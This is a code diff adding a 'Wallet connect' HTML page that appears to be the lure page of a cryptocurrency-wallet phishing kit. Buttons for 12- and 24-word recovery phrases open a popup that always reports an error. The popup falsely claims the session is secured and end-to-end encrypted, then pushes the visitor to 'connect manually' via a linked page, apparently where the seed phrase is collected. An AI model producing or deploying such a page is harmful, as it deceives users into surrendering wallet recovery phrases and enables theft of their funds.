@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="popup.css"
+</head>
+
+<body>
+
+    <header class="sticky"> <h3>Wallet connect</h3>
+     <div class="img-container">
+        <img src="icoo.png" id="img1">
+        <img src="wallet.png">
+       </div>
+    </header>
+  <h1>Conect to server</h1>
+
+    <div class="container">
+   
+        <div class="btn">
+         <button type="submit" class="btn1" onclick="openpopup()">
+            12 phrases words
+            </button>
+      
+            <button type="submit" class="btn2" onclick="openpopup()">
+                24 phrase words
+             </button>
+        </div>
+
+      <div class="popup" id="popup">
+        <img src="wwww.png">
+         <p class="rect1">This session is secured and encrypted</p>
+
+         <P class="rect2"> An error occured... please try again or connect manually</P>
+         <div class="rect3">Try Again</div>
+
+          <a href="connect.html"><button type="button"  onclick="closepopup()">connect manually</button></a>
+           <p class="rect4">This session is protected with an end-to-end encryption</p>
+        </div>
+    </div>
+    
+    <script>
+        let popup =document.getElementById("popup");
+        function openpopup(){
+         popup.classList.add("open-popup");   
+        }
+
+        function closepopup(){
+         popup.classList.remove("open-popup");   
+        }
+    </script>
+ 
+ <img src="wwww.png" id="img4">
+
+    <footer class="footer">
+        <div>
+            <h2>Company</h2>
+            <p> how it works</p>
+            <p>pricing</p>
+            <p>docs</p>
+        </div>
+        <div>ABOUT
+           <p>Terms & conditions</p>
+           <p>privacy policy</p>
+        </div>
+    </footer>
+</body>
+</html>
+</html>
